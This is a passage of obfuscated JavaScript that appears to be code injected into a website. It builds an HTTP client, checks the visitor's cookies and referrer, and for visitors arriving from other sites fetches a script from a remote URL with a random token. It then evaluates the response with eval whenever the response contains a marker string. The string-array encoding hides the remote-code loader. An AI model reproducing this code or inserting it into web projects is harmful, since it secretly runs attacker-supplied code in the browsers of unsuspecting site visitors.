U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};